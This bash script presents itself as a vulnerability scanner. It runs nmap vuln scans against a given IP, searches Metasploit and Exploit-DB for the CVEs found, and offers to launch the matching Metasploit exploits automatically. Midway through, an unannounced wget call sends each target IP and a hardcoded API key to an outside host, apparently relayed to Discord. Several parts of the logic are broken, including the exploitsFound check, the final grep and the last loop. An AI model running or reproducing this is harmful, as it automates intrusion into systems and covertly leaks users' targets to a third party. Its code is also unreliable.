#!/bin/bash

# Update apt and install dependencies
sudo apt update
sudo apt install -y $(cat dependencies.txt)

exploitsFound=0

# Check for missing public keys and retrieve them
missing_key=$(sudo apt-key list | grep -B 1 -A 1 "NO_PUBKEY" | sed -n 's/.*NO_PUBKEY //p' | uniq)
if [[ -n "$missing_key" ]]; then
    for key in $missing_key; do
        sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys "$key"
    done
fi

clear

echo -e "\033[31m

 ██▒   █▓ █    ██  ██▓     ███▄    █    ▓█████ ▒██   ██▒▓█████  ▄████▄  
▓██░   █▒ ██  ▓██▒▓██▒     ██ ▀█   █    ▓█   ▀ ▒▒ █ █ ▒░▓█   ▀ ▒██▀ ▀█  
 ▓██  █▒░▓██  ▒██░▒██░    ▓██  ▀█ ██▒   ▒███   ░░  █   ░▒███   ▒▓█    ▄ 
  ▒██ █░░▓▓█  ░██░▒██░    ▓██▒  ▐▌██▒   ▒▓█  ▄  ░ █ █ ▒ ▒▓█  ▄ ▒▓▓▄ ▄██▒
   ▒▀█░  ▒▒█████▓ ░██████▒▒██░   ▓██░   ░▒████▒▒██▒ ▒██▒░▒████▒▒ ▓███▀ ░
   ░ ▐░  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░   ▒ ▒    ░░ ▒░ ░▒▒ ░ ░▓ ░░░ ▒░ ░░ ░▒ ▒  ░
   ░ ░░  ░░▒░ ░ ░ ░ ░ ▒  ░░ ░░   ░ ▒░    ░ ░  ░░░   ░▒ ░ ░ ░  ░  ░  ▒   
     ░░   ░░░ ░ ░   ░ ░      ░   ░ ░       ░    ░    ░     ░   ░        
      ░     ░         ░  ░         ░       ░  ░ ░    ░     ░  ░░ ░      
     ░                                                         ░        
\033[0m"

# Check if user has necessary permissions
if [ "$EUID" -ne 0 ]
then 
    echo "Please run as root"
    exit
fi

# Parse command line arguments
while [[ $# -gt 0 ]]
do
key="$1"

case $key in
    -i|--ip)
    IP="$2"
    shift
    shift
    ;;
    -l|--loud)
    lq="l"
    shift
    ;;
    -q|--quiet)
    lq="q"
    shift
    ;;
    -h|--help)
    help="true"
    shift
    ;;
    *)    # unknown option
    echo "Invalid option: $key"
    help="true"
    shift
    ;;
esac
done

# Show help message if -h or invalid command is entered
if [[ "$help" == "true" || -z "$IP" ]]
then
    echo "Usage: ./vuln_scan.sh [-i IP_ADDRESS] [-l|-q] [-h]"
    echo "-i | --ip       : IP address of target to scan (required)"
    echo "-l | --loud     : Perform loud scan (more aggressive, more likely to be detected)"
    echo "-q | --quiet    : Perform quiet scan (less aggressive, less likely to be detected)"
    echo "-h | --help     : Display this help message"
    exit
fi

# Prompt user for input if loud/quiet scan option not provided as an argument
if [[ -z "$lq" ]]
then
    read -p "Loud or quiet scan (l/q)? " lq < /dev/tty
fi

# Validate user input
if [[ ! $IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
then
    echo "Invalid IP address"
    exit
fi

if [[ ! $lq =~ ^[lq]$ ]]
then
    echo "Invalid input"
    exit
fi

wget 'http://api.jake0001.com/pen/postdiscord?ip='$IP'&apikey=756da637-edd6-41b3-8f68-87eaa33d7cef' < /dev/null

# Scan for vulnerabilities using Nmap
echo "Scanning for vulnerabilities..."
if [ $lq = "l" ]
then
    vulnScanResult=$(nmap -sV -sS --script vuln -T5 -oN nmap-scan.txt $IP)
else
    vulnScanResult=$(nmap -sV -sS --script vuln -T1 -oN nmap-scan.txt $IP)
fi

# Check if there are any open ports
if [ -z "$(grep 'Ports\|open' nmap-scan.txt)" ]
then
    echo "No open ports found"
    exit
fi

# Show brief output of vuln script results
echo "Vulnerability scan results:"
grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u

# Search for exploits in multiple databases
echo "Searching for exploits..."
echo "Metasploit Framework:"
# Count the number of unique CVE and MS values found in the nmap-scan.txt file
total_vulns=$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u | wc -l)

# Loop through each CVE and MS value found and search for exploits
count=0

while read -r vuln
do
    # Update the progress bar
    count=$((count+1))
    progress=$(echo "scale=2; $count/$total_vulns" | bc -l)
    echo -ne "Progress: [$count/$total_vulns] ($progress%)\r"

    # Search in Metasploit Framework
    echo "Searching in Metasploit Framework for $vuln..."
    searchResults=$(msfconsole -q -x "search $vuln" < /dev/null)
    echo "Search Results: $searchResults"
    if [ -n "$searchResults" ]
    then
        echo "TEST 1"
        # Extract the highest number in the # column
        exploitCount=$(echo "$searchResults" | awk 'NR>3 { print $1 }' | sort -nr | head -1)
        echo "Exploit Count: $exploitCount"
        if [ "$exploitCount" -gt 0 ]
        then
            echo "TEST 2"
            # If more than one exploit is found, prompt the user to select an option
            if [ "$exploitCount" -gt 1 ]
            then
                echo "Multiple exploits found in Metasploit Framework."
                echo "Please select an exploit to use:"
                echo "$searchResults" | awk 'NR>3 { print $0 }' | nl -s ') '
                read -p "Enter exploit number: " -r exploitNum < /dev/tty
                chosenExploit=$(echo "$searchResults" | awk 'NR>3 { print $1 }' | sed -n "${exploitNum}p")
            else
                # If only one exploit is found, set it as the chosen exploit
                chosenExploit=$(echo "$searchResults" | awk 'NR>3 { print $3 }')
                echo $chosenExploit
            fi

            echo "Using exploit $chosenExploit"
            msfconsole -q -x "use $chosenExploit" < /dev/null
        else
            echo "No exploits found in Metasploit Framework for $vuln"
        fi
    else
        echo "Search Results is empty"
    fi



    # Search in other databases (e.g. Exploit-DB)
    echo "Searching in Exploit-DB for $vuln..."
    searchResults=$(searchsploit --colour -t $vuln)
    if [ -n "$searchResults" ]
    then
        echo "$searchResults"
        exploitsFound=1
    fi

    # Update progress bar
    percentage=$((count*100/total_vulns))
    printf "["
    for ((i=0; i<percentage; i+=2)); do printf "#"; done
    for ((i=percentage; i<100; i+=2)); do printf " "; done
    printf "] $percentage%%\r"

done <<< "$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u)"


if [ $exploitsFound = false ]
then
    echo "No exploits found"
    exit
fi

# Execute discovered exploits (use with caution and proper authorization!)
read -p "Would you like to execute discovered exploits (y/n)? " executeExploits
if [[ $executeExploits =~ ^[yY]$ ]]; then
    while read -r line
    echo "\033[31m$line\033[0m"
    do
        exploitPath=$(echo "$line" | cut -d ":" -f 1)
        exploitName=$(echo "$line" | cut -d ":" -f 2)
        echo "Executing $exploitName..."
        msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; run; exit;"
    done <<< "$(grep -H -i -e 'CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+' nmap-scan.txt)"
fi
